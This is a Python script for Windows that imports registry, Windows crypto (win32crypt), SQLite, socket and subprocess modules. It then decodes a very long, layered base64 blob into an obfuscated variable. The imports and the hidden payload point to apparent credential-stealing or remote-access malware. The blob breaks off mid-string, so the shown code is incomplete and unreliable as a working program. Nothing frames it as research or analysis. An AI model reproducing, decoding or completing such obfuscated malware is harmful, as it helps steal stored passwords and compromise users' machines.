import base64
import subprocess
import tempfile
import _winreg
import platform
import time
import os
import socket
import urllib
import sqlite3
import win32crypt
import sys

A13BGD = base64.b64decode(b'Vm0weE5GbFdWWGhVV0d4WFltdHdUMVp0TVZOWFJteFZVMnhPYUZKc1NsWlZNbmhQWVd4S2MxZHFRbUZTVjFKSVZqQmtTMUl4VG5OYVJtaG9UV3N3ZUZadE1UUlpWMDE1Vkd0a1dHSkdjSEJXTUdSdlZGWlplRmRzV214U2JIQjZWa2MxVDFZeVNrZGpSbWhhWWtaV05GUnJXbHBsUm1SelYyMTRVMDFFVmxwV1ZFb3dWakZhU0ZOcmFHaFNlbXhoVm10V2NrMUdjRVZTYlhSWVVqRktTVlZ0TVhkaFZscHpZMFp3VjFaNlJYZFpla3BIVmpGT1dXSkhlRk5XUjNob1ZtMXdUMVV5UmtkalJtaHNVbTVDYzFWdE1WTk5SbEY0VjIxMFZXSkZjRWRXTW5SM1ZqRmFSbU5FVGxkaGExcFRXbFZhZDFKdFNrZFRiV3hYVFcxb1dsWnJXbGRaVm14V1RWaE9hbEp0VWxsWmJHaFRZMVpTVjJGRlRsUmlSbkJKVkZaU1UxWXdNWEpqUm5CWVZrVTFkbFpxUmtwbGJVWkpVMjFHVTFKWVFrbFdiVEY2WlVaa1YxTnVUbFJpVjNod1ZXMDFRMVpXV25KWGJYQk9WbXhhZVZSV1ZtdFdNV1JJWVVac1dtRXhXak5aZWtaWFpFZFdSbVJIZUdsU2JrRjNWMnRXYjJFeFduSk5WbHBxVWxkU1YxUlhjRmRYUmxwMFl6Tm9hbFpzY0hoV1IzaGhZVlprUmsxVVVsZGlWRVkyV2xWYWExWXhTblZUYkVKWFlrVndWVlpHWTNoaU1WWnpWMWhvV0dKWVFuTlZha0pYVFRGU1YxZHRkRmRpVlhCSlZsZDRZVll5UlhoWGEzaGFaV3RhZWxac1dsTmpiRTUwWlVkc1UwMHhSalpXYlRFMFlqSkplRmRZYkZSaE1YQnhWVzE0ZDFsV2JGVlNibVJYVW14d2VGVXlkR0ZoTURGRlZteGtWMUl6YUZoV1IzaGhZekpPUlZkc1pGZE5NbWh2Vm0xd1IxbFdXWGhUYmxaVVlYcHNXRlJVUmt0VlJscEhWbXhrYTAxWFVraFdNalZQVm0xRmVWVnNhRnBpUm5Cb1ZUQmFWbVZWTlZaUFZuQlhWa1ZKTVZkV1ZtRlpWbVJ6V2tWc1VtRXlhRmhaVkVaM1lVWnNObEp0ZEd0U2EzQjZWakl4YzFVeFdrZFhiR3hYWWxob2FGbHFTa1psUjBwSFYyczFWMVpzY0ZWWFYzUmhaREZaZUZkdVVteFNia0p5VkZaYVlXVldaSEpXYWtKV1RVUkdWMVJzYUhOWFIwVjRZMGhLVjFaRmNFeFZNVnBIWTJ4YWMxcEZOV2hoTVZZelZtMHhkMUl4VFhsVVdHaFZZbXhhVmxsclpGTmpSbFowWkVoa1YxSnNjRWhXYlhoclZqSkdObEpzYUZkaVIyaDJWbXBLUzFaWFNrZGFSbFpYVFRGSmVsWlVSbUZXYlZaWVZtdHNWV0pHY0hCV2JHaERWakZhV0UxSVpFOVdiR3cxVlcwMVMxUXhaRWRqUjBaaFZqTlNhRlpyV2xaa01WcFpZVVpvVTAxVmNFcFhWM1JoVkRGU2MxZHNiRkpoTTJoWVdXeG9iMk5XY0ZaV1ZFWlVVbXR3ZWxkclpFZFZNVnAxVVd4YVdGWjZSWGRhUkVaelZqRmtkVlZyTlZkbGJYaFdWa1phYTA1SFZrZFdiR2hxVWxVMVdGbHNWbmRXTVZKelZtMDVWMDFWYkRaWlZWcERWakpHY2xkdFJtRldWbkJRV2taYVYyTXhjRWhpUms1cFUwVktZVlp0ZUd0a01VbDRZa1prV0ZkSGFGZFpiWFIzVmpGc2NsWnVaRmhTYkZwNFZrY3dOVlpXU25OalJscFdWak5vY2xsWGMzaGphelZXWVVaa1RtSnRhRmxXYlhSaFdWWkplRnBJVmxKaVIxSnZXVlJHZDFSV1dsVlRhbEpvVFdzMWVsa3dWbTlWUmxsNVlVaENWMkpIYUVSV01WcGhZMVpPV1dGSGRFNVdiWGN3VmxSSk1WVXhXblJUYmxaU1lsVmFXRmx0TlVOVFJscFdWMjVrVTJKR2NGWldiWGh2VmpBeFJWWnJjRmhXTTFKWFZGWmtSMVl4VG5GWGJXaE9UVEJLV1ZkV1pEQlRNV1JIV2taa1lWSldjSE5XYlhoTFpWWnNWbGRzVG1oV01IQkhXVEJhYjFkR1dqWlNWRUpoVWtWd1VGbDZSbGRqTVZwelUyeGtVMVp1UWpKV01XUXdXVlpzVjFkdVRsaGhNbWh6VldwT1UyTkdWblJsU0U1T1RWWktlbFpYZEU5V01ERnlZMFphVjJKWWFIWldNbmhoVW14a2NtVkdjR3hoTTBKUlZsUkdZVlV5VFhsVWExcFBWakpvY0ZWdE5VTlZNVnB4VW14T1VrMXJWalJXUnpWVFZqSktSMk5HUWxkaVZFWjJWbTE0YzJOc1pIVmFSM0JUWWxob05WWnFTVEZaVjBwSFUyNU9WMkZzU2xsWlZFcFNaREZzVlZGWWFGZE5WbkI0VmxkNFlWUnRTblJoUnpsWFRWWndhRlV5TVZkVFJsSnlXa1pvYVZORlNsbFdWM2hYWkRKSmVGZHVTbFpoTWxKWVZGZHplRTVHV2xoT1ZYUlhVakJ3UjFVeWVHOVdNa1p5VGxoYVZtSllhR2hXYkZwUFkxWkdkR0pGTldoTldFSlpWbXRhWVdJeFNYbFNiR1JWWVRKU1dWbHNWbUZaVmxweVZtNWtWMUpzYkROV01uaHJZVzFLU1ZGclpGaGhNWEJVVm1wS1IwNXNXbGxoUm1Sb1lUSjNNRmRZY0VkWGJWRjNUVlprWVZJelFsUldiWFIzVjJ4a1YxVnJaR3ROYkVwNlZqSjRWMVpIU2taT1dFWlZWbXh3YUZwV1duTldiR1J5VDFkb1UwMUdXVEJYVkVKdllURmtSMWRZY0doU2JWSldWbTB4VTFaR2JEWlNibVJUWWxWd1NWa3dXbE5WTVdSR1UyeEtWMkpVUlRCV1ZFWktaVlphY2xwR1pHbGhlbFoyVmxSQ2ExVXhXbk5WYkdoclVqQmFjMWxyWkRSbFZscFlaVVU1VjAxV2NIcFpNRnB2Vm1zeGRWVlVRbGRoYTBZMFZXcEtUMUp0VmtkYVIyeFlVakpvVGxZeFVrdE9SbXhZVkc1S1QxWnRhRzlWYWtwdlZERmFkRTFVUWs5V2JIQXdXa1ZrUjFkc1duTldhbEpYVW0xb2RsWnJaRXRqYXpWWFlVWmtUbEl4U2xWV2JYUmhZekZhVjFOdVVsTmlSbHBQVmpCV1MxZHNaSEpXYlVab1RWWkdOVlV5ZEd0V1IwcElZVVpvVjJGck5WUlVWRVp6Vm14a2RGSnNaR2hsYkZwaFYxUkNZVmxXVW5SVGJrNVVZbFJzV0ZscldrdFJNWEJXVjIxR1dGSnJOWGxYYTJSdlZUSktTVkZzYkZoV00xSm9XVEl4VW1WR1pIVlZhelZYVW10d1ZsWkdXbUZrTVU1SFZtNVNiRkp0VW05V2JYUjNWMnhXV0dWRk9WZFdiR3cyVmtab2IxbFdTa1pYYkdSaFZteFZlRll4V2xOak1VNTBZa1prVjFKc2EzaFdha1pyVFVaWmVWSllhRmhpYkVwVVZqQmtiMk5XVm5SbFNHUllVbTE0ZWxsVldrOVdWa3AwWlVod1YwMXFSa2hXYWtwTFVqSk9TV0pHYUdoTldFSjVWbTF3UzFJd05YTlhia3BZWWtkU1dGbHJhRU5OYkZwWlkwVmtWVTFyTVRSVk1uaHpZVlpLYzJOSVFsZE5SbHBNVmpCYWExWXhjRVZSYlhCb1pXdGFXVmRVUWxkaU1rcEhWR3RrYWxORk5WaFpWM1JoWVVaVmVGZHVaRmRpUjFKNVdrVmFWMkZXV2xsUmJIQlhUV3BXTTFWcVJtdFNNV1JaWTBaS2FFMHhTbTlXYlhoclZURlNSMVp1UmxOaE0xSnhWRmQwZDFOR1pISmFSemxvVWxSR1NsVlhjRTlXTWtWNFkwWm9XbUZyY0V0YVZscFBWMWRHU0dOR1RsZE5WWEJ2VmpKNGEwMUdiRmhUV0docFUwVTFXRmxzVm1GV1JscDBaVVYwYkdKSFVubFdWM2hQWVVaYWNtTkliRnBoTVVwVVZtcEtTMVpXV25OaFJtUm9UVmhDYjFadE1YcE5WbHBYV2toT2FGSXlhRzlVVldNMVRteGFjbHBFVWxwV2JFWTBWMnRXWVZReFduTmpTRVpXWWxoU00xWkVSbE5XYkZaeldrVTFWMkpJUWxkV1ZFWlRVakpHY2sxV1dsaGhhMHBZVm1wT1UyRkdiSEpYYTNSclVqQmFTRlZYZUd0VWJFcDFVVmh3VjJFeVVUQldNakZTWlVaa2MxWnNTbWxYUmtwUVZtMXdSMU14WkZkYVJtUlhZa2RTVDFWdGVFdGxiRlY0WVVjNVYxSXdjRXBWVjNoclZqSktWVkp1V2xkaE1YQjZWbXhhUjFkWFJraGtSazVPVm01Q1NGWnNZM2hPUjBsNVVtdGFUbGRGY0U5Vk1HUnZWMFpXZEdWRmRGTlNiWGN5VlcxME1GVXlSalppUm1oYVlUSlNTRlpVUVhka01VNTFXa1prYVZaRlZYZFhhMUpDWlVaSmVGcEdiR2xTTTJoVVdsY3hORmRHV2tkYVJFSmFWbFJHU0ZadE5WTmhNVXAwVlcwNVYyRnJXbWhhVmxwYVpWZFNSVlZzY0ZkaE0wSklWMVpvZDFJeFdYaFRiR1JxVTBWd1lWUlhOVzlOTVZaeFVtNWtWRkl3Y0VoWGExcHJWR3N4ZEdGRk1WZGlWRVYzV1ZjeFYxSnJOVlpoUms1WVVqSm9WbGRYTVRCWlYwNUhWbTVLV0dKVldsbFdiVEUwWlZaa2NsZHJPV2hpVlhCSlZsZHdRMVpXV25OWGJXaGFZVEZ3YUZsNlNrOVRWMFpIV2tkc1dGSXlaekpXYlhSclpXMVdSMXBHWkZOaWJGcFpXV3RrYjFkR1VsVlNhM1JPWWtad01Ga3dWakJXUlRGV1kwUkNWMVl6VW1oWFZscExZekZPZEU5V1ZsZGlWMmhGVm0xNFlWbFdTWGhhU0U1VllsaENUMVp0ZUhkT2JGcDBUVlJTYUUxWFVrbFZNblJoVkRGYWMxZHNhRnBoTWxKMldrZDRWMk14WkhOYVJtaFRWa1phV1ZZeWRHRmlNa1pYVTI1U1VGTkhlRmhXYm5CQ1pVWmFSVkp0UmxkTlZUVjZWakp6TlZZeFduSmpSbVJYWWxoQ1VGbHFTbGRqTVdSWldrZEdVMkpXU2xWV2JURXdaREF4UjFadVVteFNNRnBXV1d4V2QyVldVbGRWYkdSWFRWWndlbFV5ZERSWGJWWnlWMnRvV21WcmNFdGFWM2gzVTBkS1IxUnNaR2hOTUVwV1ZtcEdZV0V3TVVkVVdHeFZZa2RTY0ZVd1drdFVNVmwzWVVWT1ZVMVhlSGxXYlhoclZERmFkR1ZJYkZkaVdGRjNWako0WVZaV1NuSmlSMFpYVm14d1dWWnRNVFJaVjFKSFZtNVdWR0pHY0U5WmJURnZVMFprY2xWclpGUk5iRXBIVkd4YWEyRnNTbFZXYlRsYVZrVmFNMVl5ZUZwbFJtdDZXa2Q0VTJFeWR6QldNblJoWVRGYWRGTnVTbGhpUlRWaFdXdGtiMUpHYTNkWGJrNXFUV3RhU1ZReFpEQlZNa3BYVTJ4c1YySkhVWGRVVlZwYVpEQXhWbFpzWkdsU01VcG9WMVpTUjFsV1pFZFhhMmhzVWxoQ2MxWnRlR0ZsYkd0M1YyeGtWMDFWY0ZwVlYzaFhWMGRGZUZOcmFGcGxhM0JVVlcxek1WWXhaSFJrUms1T1ltMW9WbFl4WTNoTlJrcDBWbXRrV0dFeWFITlZha0poVlRGU1dHUkhSbXhpUmxZMFdWVmpOVmRHU1hkWGJteFhUVzVvY2xkV1dscGxiRlp4Vkd4a1RsSnVRbFZYV0hCSFdWZE9WMUp1VGxWaGVsWlVWV3BPYjFkR1duUmtSM0JzVWpCc05GWXhhSE5XTWtweVRsWnNWMkV4V21oV01GcFRWMFUxV0U5WGNHbFNNMmhhVmtaYVlWUXhXWGROVm1SVVltMTRXRlJYY0Vaa01WcFZVbTFHYTFaclducFpNRnByWVZaYVJsZFljRmhYU0VKSVZYcEdXbVZHY0VsV2JGWnBVakpvZGxaR1VrZFRNV1JIVjJ0a1dHSkhVbkpVVmxwelRrWmFXRTVWT1ZoU01IQkpWbGQ0YzFZeVNrZFRhMmhYVFVad1lWcFdaRmRTTVhCSFdrZHNWMWRGU2twV01WSkRWakF4UjFwSVVsZGlhM0JWV1cwMVExWXhiRmhrUjBaV1VtMTBOVnBWWkRCaGF6RlhVMjVzVldKR2NISldWRUYzWlZkR1IxWnNaR2xYUjJodlZqRmFZV014V1hoWGJHeG9VbXhhY0ZWdE5VTmxiRnBZWlVkR1ZFMVdWalJXTVdocldWWktjazVXV2xwaE1YQm9WRlZhY21ReVJrWmtSMnhUVFVoQ1NsZHNWbUZpTVdSSFdrVnNVbUV5YUdGWlZFWjNZVVp3UjFkclpHcE5hM0JJV1ZWYWExVXhXa2RYYkhCWFlsUkZkMVp0TVZkU01VNVpZVWRHVkZKcmNGVlhWM1JyWWpGYVIxWnVUbGRpYlZKVlZtMTRkMlZXV1hsTlZXUlhZWHBHVjFsclVrOVdWVEZYWTBkb1YyRXlVa3hWYlRGUFVtczVWMWR0YkZOaE0wSmFWbXhTUTFsV2JGaFVXR2hYWW10d2FGVnRlR0ZqUmxwelZXeGtWRkpzY0hsWFdIQkhWV3N4VjFkdWNGZE5WMmg2Vm0weFJtVnNWbk5hUm1Sb1RWWndUVlpVUW1Gak1sSklWbXRhVUZadFVuQlZiWFIzVGxaYVZWTllhRk5OVmtwNlZqRm9jMVpzV2taalJtaFZWbnBXVkZwSGVGZFdWazV5V2tab1UyRjZWWGhXVkVsNFpERmFSMU5zVmxkaVNFSlpWbTV3UTA1R2NGaE5WbVJUVFZkU01WVXllRzloVjBwWFUyeHdWMkpVUlRCWFZtUlhZekZ3U1ZOc2FHbGlWa3BaVmtaV1UxRXdOVmRhU0VwV1lrVTFXRlJWVWtkTlZteFdWMjA1VjAxcldubFZiR2h2Vm0xS1ZWSnNVbFppVkVaTVZXcEdWMlJIU2tkaFJrNU9ZbGRuZVZadE1UQlpWMFowVm10YVQxWldjRkJXTUZVeFkxWldjMWR1WkdsTlZscDZXVlZhVDFac1NuTmpSRUpWVm0xUmQxWkVSbUZrVmtaeVdrWm9hRTFWY0ZWWFZscGhVekpOZUZkdVJsaGlSMmh2VkZkemVFNUdXbkZUV0doVVRWWndXRlV5TlV0aFJrbDNWMnhTVjJKVVZrTmFWM2hoWkVkU1NHUkdXbWxXYkhCWlYxUkNWMWxXVVhoWGJrcHFVbFJzVmxacVRtOVVSbEpYVjIxR2FsWnJXbnBXUjNoWFZHMUZlRmRVUmxkaE1sRjNXV3BHWVZOR1RuVlViR2hwVW14d2FGZFhkR3RpTWxKellrWmFXR0p0VWxoVVZscGhaV3hrY2xkdGRGWk5hM0JJV1RCU1lWWXlTbFZSYWxKVlZsWndlbFl3V2s5amJIQkhXa2RvYVZKWVFtOVdNVnByWldzeFYxWnJaRmRYUjNoelZXeFNjMVpHVWxoamVrWlVWbXhHTkZZeU5XdGhSa3BWVW1wQ1dsWldjSHBXTUZwYVpXeFdjMkZHVmxkV2JrSlpWMnRXWVZReFpGaFRhMmhUWWtVMVdWVnNWbmRXVmxweVYyeGtWMDFYZUZsV1YzaHJWMFprU0dWSVRsWmlia0o2V1RCYVUxZEhVa2hTYlhocFVqTlJlbFpxU1RGVU1WcDBVMnhhV0dKdGVGZFVWelZTWkRGYWRFMVZkRmRXYTNCNlZsY3hSMVV4U2xkalJGcFlZVEZhVjFwVldscGxSbFoxVlcxMFUwMXVhRmxYVmxKSFkyMVdWMWR1VW10U00xSlBWVzB4TkZkV1ZuUk9WazVYVWpCd2VWa3dhRWRXYlVWNFYycE9XRlpzY0ZSV01GVXhWbXhTY2s1WGJGTmlSM1ExVm14YWFrMVdVWGhXV0doVVltdHdXVmxyWkRSWFZteFZVbTFHVGsxV2NGbFplazV2VlRKS1NGVnFSbGRpV0dob1ZrZDRZV015VGtkU2JHUlhZa1Z3VFZac1kzaFdNVTVIVkc1S1lWSXllRlJaYTFwM1pERmtXRTFVUWxSTlZYQjZWakZvYzJGc1NsVmlSazVWVmpOTmVGcFhlR3RqYlVaR1QxWndWMkV6UVhoV1ZtTjRZakZhVjFkdVVtaFNWa3BXVm14YWQyVnNhM2xOVldSVVZteEtlbGt3V210aFZrcHpZVE5vVjJGcmIzZFpha3BHWlVaa2MxZHJOVmhTYTNCWVYxWmtNR1F4WkZkaVJtaHJVbGhTYzFscldtRmxWbGw1WkVkMFdGSnJjREZWVjNSelYyeGFWMk5JU2xkU00yaGhXbGN4UjFKV1NuTmFSMnhZVW10d05WWXllR3RsYXpGWFYxaHNWV0V5ZUZaWmExcGhZMFpXY1ZKcmRGZFNiVkpaV2xWa1IyRXdNVmRqUm1oWFlsUldVRlp0TVV0amF6VlhZVVprYVZkSFozcFhiRnBoV1Zaa1JrNVdhRk5pUjFKVVZtdFdZVk5zWkhOV2JHUlhUVlp3ZWxZeU5WTldiVXB5WTBaa1ZWWjZWblpWYWtaM1VsWktjbVJIZEZOV1JscFpWbXhrTkdFeFdYaFhhMlJZWVRGYVdGUldXbmRqYkZKV1drVTFiRkpyTlRGV1IzaGhZVmRLUm1OR1NsZGlXRUpFVjFaYWExSXhWbk5YYkZwcFVqRktVVlp0TVRSV01EVkhWMjVTVGxaRlNtOVpXSEJIWlZacmQxZHRkRmhpVlZZMFZqSTFZVll4U2taWGJrcFdZV3R3VUZWdGN6RldNWEJJWVVkb1RtRnRaM3BXYlhSaFZURkplRlZZYUZoaWF6VnhWV3hrTkZac2JITmhSemxwVFZaS1dWUnNZelZXUjBwSFkwVmFWbUpVUVRGV2FrRjRZMnhrYzJGR1drNVdNbWcyVjFkMFlWTXhTbk5hU0U1cFVtNUNiMVJXV2xkT1JscFlaRWRHYTAxVk5VZFVWbHBoVlVaWmVsRnNVbHBXUlZveVdsVmFZV1JGTVVsaFIzQk9WbXR3TlZaR1dtRlpWbVJJVW1wYVUySkhVbFpXYlhoM1lVWmFWbGRzWkZoU01WcEtWakl4TUZSdFJYcFJhMmhYWWtkUk1GVjZSbHBrTURGWlZHeFNhRTB5YUZsV2JURTBVekZLUjFacVdsUmlSVFZZVkZab1ExTnNXa2hOVnpsV1RXdFpNbFp0TURWWFJsbDZZVVpvWVZKRlJqUlZha1pYVjFkR1NHRkdUbGRXUmxveVZqRmtNRll5VVhsV2EyUnBVMFZ3YjFWcVRsTlhWbXhaWTBWa1ZGSnRlRnBaTUZaclYwZEtSMk5HYUZwTlJrcFFWbTF6ZUZJeVRrZGhSMFpUWWxaS1RWWlVRbUZUTWsxNVVtdGtWV0pIVWxSWmExcGFUVlphZEdWSE9XdE5WVlkwVmxab2MxWlhTbkpPVmxwWFRVZFNWRlp0ZUhOa1IxSkdaRVphVGxadVFqUldWRW8wVkRGYVJrMVdaRmhpUm5CWFZtcE9VbVF4YkZWUldHaFlVbXhhZUZWWGVIZGhSVEZYWTBaR1dGWnNTa05hVldSUFpFWlNjbGR0YkZOaVNFSjNWbXBDVjFNeFNsZFhXR2hZWWxoU1ZWUldXbmRYVmxWNVpFWmtWMDFyY0VwVlZ6VkRWbTFLUjFOclVsVmhNWEJ5V1RKNFlXUkdTblJqUlRWWFRWVndTbFp0ZUdwTlZsVjRWbXRrV0ZkSGVHOVZiVEZ2WVVaYWNWUnRPV2hTYmtKWldsVmFhMVF5U2taWGJteFZUVmRTTTFsV1dtRmpiVTVIWWtab1YxSlZjRzlYVjNCSFZXMVdSMXBHYkdwU2JIQndXVlJHZDFZeFduUmtSbVJyVFZad1NGa3dWbGRWTWtwMFZXeFNXbUV5YUVSVk1WcFRZekZ3U1ZSc1ZtbFNWRlpJVmxkNGIyTXhXWGxTV0docVUwWndZVnBYZEdGVU1YQlhWMjFHYWsxcldrbGFSVnBQWWtkS1IyTkhPVmROVm5CeVdsZHplRll4VWxsaFIwWlVVbFp3VmxkV2FIZGpNVnBYVm01R1UySlZXbFZXYlRFMFZqRmtjbFZyVGxkaGVrWkdWVzE0ZDFac1duUmhTSEJYVFVad2FGVnRNVXRTVmxKMFVteE9VMWRGU2xaV2JYQkRXVlpSZVZSWWJGTmhNbEpXV1d4a05GZFdWbk5XYm1ST1lrWndlbGRyYUd0V1JURkZWbXRrVlZac2NISlhWbHBQVW1zMVYxZHNjR2xTYTNCWlYxUkdZVll5VFhsU2EyaFFWbFJXVkZscmFFSmtNVnBJWlVkR2FFMVhVbnBXTWpWTFZERmFXRlZzV2xwV1JYQjJWRlJHV21WWFZraFNiWFJUVFVad1NWWnNaRFJrTWtaSVVsaGthVkpGTlZoV2FrNVRZVVpzTmxGVVJtcE5WbkF4VlRKNFExWXdNWFJoUm14WFVteGFWRlp0TVZkak1XUjFVMnhhYUUweFNuWldSbVEwVXpKV2MySklSbFZpV0ZKdlZtMTBkMWRHVlhsbFJUbFhUV3RhZVZrd1dsTldiVlp5VjJ4b1YySkdjRWhaTW5oM1UwZEtTR0pHVGxkU2JIQmFWbXBHWVZZeGJGZFZXR3hVWVRKU1dWWXdaRzlYVm14eVYyNWtXbFp0ZUZsYVJWWjNZVEF4VjFacVZtRldWbHBvV1ZSQmVGWnRUa1ZSYkZacFVtNUNWVlp0Y0VkWlZscFhWMjVLVm1KSFVrOVpiWFJMVWxaa1dXTkZaRlJOVld3MFZUSTFUMkZHU1hkWGJGSlhUVVphVEZacldtRlNNVnB6V2tad1YwMVZjRmxXTW5SaFl6SkdjMU5zVm1sU2JXaFdWbXBPVTJGR1dYaFhiVVpVVWpGS1NsWkhlR3RWTURGSlVXcGFXRlpGU25KVmFrWmhWakZrV1dOSGFGTk5iV2hYVjFkNGIySXlWbGRqUm1oT1ZsZFNVRmxyVm5kbGJGbDVaVWQwVldKRmJEWlhWRTV6VmpKS1IyTklSbUZXVmxWNFZUQmFTMk15UmtkVWJXeFRUVzFvZGxac1VrTldNVTE0WWtaa1ZtSkdjR2hWYkZKWFZERmFkR1ZGZEZkaVJsb3dWR3hrTUZkR1NuTmpTR3hWWWtaS1NGWXljM2hUUmxaMVYyeGtWMUpWV1RCV2JYQkxWREZLVjFwSVRtaFNiVkpQVkZaV2QxVnNXbk5YYlhCc1VteFdORlpIZEd0V1YwcHpWMnhrV21FeFdreFdNVnBYWTFaS2NtUkhlRk5pVmtwYVYyeFdZVlF5Um5KTldFNVVZVEpvWVZsVVJuZGpiR1JYVjJ0MFUwMVZOVEZWVjNoaFlWWkplRkpZWkZkV00yaG9WbFJHV21WR1duVlRiRUpYVFcxb1ZWZFhkR3BPUjFaWFYyNVNUbEpGV2xWVVZtUlRUVVpXZEU1VmRGVk5WMUpIV1RCa2IxWXlTblZSYTJoWFlURndWMXBWV25kU2JWSkhWV3hrYVZKWE9UTldiR040VGtac1YxVnVUbFJpUjNoVFZqQmtORmRHVWxkWGJtUm9VbTE0VmxWdGVHRmlSbHB5WTBad1dsWlhVak5XVkVwTFYwZEdSMUpzWkZkTk1FcE5WbXhTUzFOdFZrZGFTRlpUWWtVMWNGVXdWa3RWUmxwWVRWaHdUbFpzYkRSV01uUnZWR3hLUjFkdE9WVldiSEF6VkZaYVYxZEhWa2xhUm1oVFlraENTRlpIZUdGVk1XUnpWMjVPVjJGc1NtRlVWM0JIVlVaVmVGcEZaRk5OYTFwSldXdGFUMVJzV2xsUmJFNVhZbGhTYUZacVJscGxWbEpaWVVaV2FFMVlRbEZXYlRCNFlqSk5lRlp1UmxWaVJUVlhWRlpvUTFkV2NGWlhiWFJWVFd0d1NGbHJVbGRaVmxwWVZWaGtWMkV4VmpSWk1uaHJZMVpHYzFkck5XbGlSVzk1VmpGYVlWbFdUblJXYmxKVFlUSjRVMWxyYUVOalJsbDNXa2M1VkZadFVubFdWM1JyVm1zeFZrNVZaRlZXYkhCeVZteGtTMWRXVm5WUmJHUnBWMFpLYUZaR1dtRlpWazVJVm10b1VGWnNXazlaVkVaM1YwWmFSMWR0T1ZSTlYxSkpWVEkxUzJGc1NYZFhiV2hYWVdzMVQxcFZXbUZqYkdSMVdrWmtUbGRGU2toV01uUmhZakZWZUZkclpGaGlTRUpZVldwT2IxZEdVbkpYYkdScVlYcEdXbFpIZUZOaFIwVjZVV3h3V0Zac1NraFhWbVJUWXpGa2MxWnNVbWxTV0VKNlZtMHhORk15VmtkWFdHeE9WMFUxVmxsWWNFZFhiRlpZWTNwV1YwMVZjSHBWTW5SVFdWWktSbU5GZEdGV1YxSlFWVzB4UzFOSFJraGxSMmhPVjBWSmVsWnFSbXRPUmxsNFlrWmtZVk5GTlZsWmEyUnZWREZXY2xkdFJtbE5Wa3BZVmpJMVQxUnJNVmhsU0doWFVucEJNVll3WkV0V01XUjFZa1p3VGxKdVFqSldNVnBoV1ZkTmVWUnJiR2xTTUZwWVdXdGFWbVZHV25GU2JVWmFWakZLU1ZaWGRHdFdWMFkyVm14b1dtSkdTbmxVVlZwaFkxWk9jVkZzWkU1V2EzQTFWa1phWVdJeFZYbFRiazVVWWtaYVdGUlZaRkpOUmxwRlVteGFhMDFYVWpGWGExcHJWR3hhYzJJemFGaFdSVXAyVlhwS1MxTkdUbkpoUmxwcFltdEthRlp0ZUdGWGJWRjRWMjVHVTJFelFuSlVWbVJUWlZac2NsZHRkR2hXYkhCSVZqSjRSMWRHV25OalIyaFdaV3RhWVZwVlduZFRWa3B6VTIxc1ZGSlZjRkZXYkdSM1VqRk5kMDVZVG1GVFJUVlpXV3hXWVdOc1VsZFhibVJUVFZaR05GWXlNVWRYUmtsM1kwWnNZVlpXY0hwV2JURkxVakZrY1ZSc1ZsZFNWbkI1Vm0xNFlWUXhaRmhTYTJSaFVqSjRXRmxVU1RWTk1WcHpWV3QwVDFJd2JEUldiR2h6VmtkS2MxZHNUbHBpV0ZJelZtcEdjMWRIVWtoU2JXaFRZa1Z3TmxacVNqUlVNVlY0VjI1S1QxZElRbGhWYm5CSFpHeGFWVkZZYUZkaVZUVkhXVEJhYTFZd01IbGhSRXBYVFZad2NsVnFSbHBsUm5CSlVteG9hVll6YUZaV1YzaHZVVEpKZUZkc2FFNVRSMmhYV1Zod1IxTkdiSEpoUlhSWVVqQndWbFp0TlU5WGJVVjRZMFY0VlZac2NHRmFWbFY0VmxaR2MyRkdUbWhOTUVwb1ZteGFhazFYU1hoWFdHUk9WMFphYjFWc1VuTldiR3h5V2taT1ZGSnVRa2RXTW5NMVYwWlpkMk5GYUZkTmFrWjZWakJhU21WWFJraGhSbVJvVFZoQ2VWWkhkR0ZoTWs1eVRWWmFZVkl3V2xWVmJGSlhZakZhV0dWR1RtcE5Wa1kwVmpJMVIxVXlSWHBWYkZaWFlsUkZNRnBXV25OV2JIQkdXa2RvVTJKSGQzcFdha28wV1Zaa2RGSllhRmhYUjFKWVZGZHdSMVJHV25OWGJVWnJVakJhU1ZWdGVFOWlSMFY0WTBWc1YwMXVhR2hYVmxwelZqRndSMXBHWkdsaGVsWmFWMVpvZDFZeVRrZFhia1pVWWxSc1VGbHJXbk5PUm1SeVZXdE9hRkpVUmtaV2JYUnpWbTFLVlZac1VsZGhNWEJ5VlRCa1YxSXhjRWRqUjJ4VFRXMW5lVlp0ZEd0T1IwMTVWV3RvVm1FeGNISlZiRkp6WTBaV2RHUklaRmhXYkhCNVYxUk9iMkV3TVhKWGJuQldUVzVvV0ZsVldrdFNhelZZVW14d1YxSllRakpXYWtKaFl6RmFWMVJ1U210U2JWSllWRlZvUTFNeFpGaGtSMFpwVFd0YVdGVXllRmRWTVZwR1UyeG9XbUpIYUZSWk1uaFhZMVpLY2s5V1RrNVdNVWw0Vm0weE5GWXlSbGRYV0hCb1VteGFXRlZ0ZUdGV1JscDBUVlprVjAxWFVscFphMlF3VlRBd2VGTnNiRmhXTTFKeFZHeFZkMlZIVGtkWGJHaHBWMFpLV0ZkWGVGZGtNV1JYWWtaYWFGSlViRmhVVjNSaFpWWlNjMkZIUmxkV2JHdzJXVlZvUzFZeVJuSlhhazVXWVd0YVVGcEZXa3RqYXpWWVlrWk9WMkpZVVRCV2JYQkhZVEF4U0ZOWWFGaFhSMmh3VlcweFUxWldiRmhsU0dScFRWWktWbFpIZEU5WGJGcHpVMnhhVmsxcVZqTldSM2hoWkZaR2NscEdaRTVoYkZwNVZtcENZVmxYVFhoYVNFWlNZbFZhV0ZacVJrcGxiR1JYVjIxMFUySldSalZWTW5CaFZUSktTRlZyT1ZwaVZFWjJWRmQ0WVdNeFZuSmtSbEpPVmxSV1NWWnNZekZXTVZaMFUydGFWR0pIZUZkWlYzTXhaR3hzY1ZKdFJtcFdhMW93VlcweE1GUnRSalpTVkVKWVZteEtVRmw2UmxKbFJtUnpWbTFzVkZKVmNGaFhWM2hUVWpKT2MxVnVUbGhpYXpWWVdXdGFZV1ZXV2toTlZ6bFZZa1p3VmxadGRHOVdNVnBHWTBST1dGWnNjR2hWYWtacll6RmtjazVXWkZOaE0wSmFWbXhqZDJWR1ZYaFVhMlJYVjBkU1dGWnJXbUZYVmxweFVWUkdWRlp1UWtkV01uUXdWbGRLUm1OR2FGcE5Sa3BvVm1wQmVGWXhUbk5SYkhCc1lURndTVmRyVm1GV01rNXpZMFZrV0dKWGFFOVpiVEZ2VmxaWmVGa3phRTlTTVVZMVZrZDRhMkZXVGtkVGJrNVdZa2RTVkZrd1duTmpiRnBWVW0xNGFWSXphRmhXYlhoVFVqRmtjMWRzVmxOaE0wSmhWbXhhZDJOc1duRlJXR2hxVm14d01GbFZXbmRXTWxaeVYyc3hWMkpVUmpaVVZscHJWakZXZFZSc1pHaGxiRnBRVjFjd2VHSXhVbGRYYmtaVVltMVNVMVJYZUVkT1JsbDVaRWQwVmsxcm